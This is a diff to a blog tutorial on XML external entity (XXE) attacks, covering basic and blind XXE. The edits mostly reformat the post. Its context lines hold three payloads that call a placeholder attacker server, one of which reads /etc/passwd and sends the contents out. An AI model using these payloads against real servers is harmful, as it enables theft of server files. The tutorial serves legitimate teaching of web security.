@@ -1,10 +1,16 @@
 Hi all,
 
-&nbsp;  Welcome to my blog of "From basic XXE to blind XXE"<br><br>
+In this post we will cover these following topics.
+
+What is XXE?
+How to confirm XXE?
+How Exploit Basic XXE?
+How Blind XXE works?
+and a alternative of blind XXE payload.
 
 But first let's understand some basic keywords.
 
-**Entity**: Entities reference data that act as an abbreviation or can be found at an external location. 
+**Entity**: Entities *reference* data that act as an abbreviation or can be found at an external location. Syntax:- **&test;**
 
 Most common entites are:-
 
@@ -32,7 +38,9 @@ For ex you have a url with a parameter that parses XML data somthing like this:-
 
 Now when you provide any xml data, and that data is printing back to the user's browser then you can try basic XXE. You have to confirm the vulnerability existence and this can be done by something like this.
 
-Payload 1:- `<?xml version="1.0"?>`
+**Payload 1**:- 
+
+`<?xml version="1.0"?>`
 `<!DOCTYPE root [`
 `<!ENTITY test SYSTEM 'http://yourserverip/'>]>`
 `<root>&test;</root>`
@@ -63,7 +71,9 @@ Still you can confirm the existence of the vulnerability by using the first payl
 
 So we also needed to blind means we have to use blind payload which will grep the contents of the local files of the webserver and send the contents to our server. Sound interesting, let's see how this whole theory works and also let's see that if we have some alternatives to do that.
 
-Payload 2:- `<?xml version="1.0"?>`
+**Payload 2**:- 
+
+`<?xml version="1.0"?>`
 `<!DOCTYPE root [`
 `<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]>`
 `<root>&entity;</root>`
@@ -93,7 +103,9 @@ Cool.
 
 Now, Have anyone arise a question that why we call the dtd from attacker's server? Why not this below payload works?
 
-Payload 3:- `<?xml version="1.0"?>`
+**Payload 3**:- 
+
+`<?xml version="1.0"?>`
 `<!DOCTYPE root [`
 `<!ENTITY % filecontents SYSTEM 'file:///etc/passwd>`
 `<!ENTITY test SYSTEM 'http://yourserver/%filecontents;'>]>`
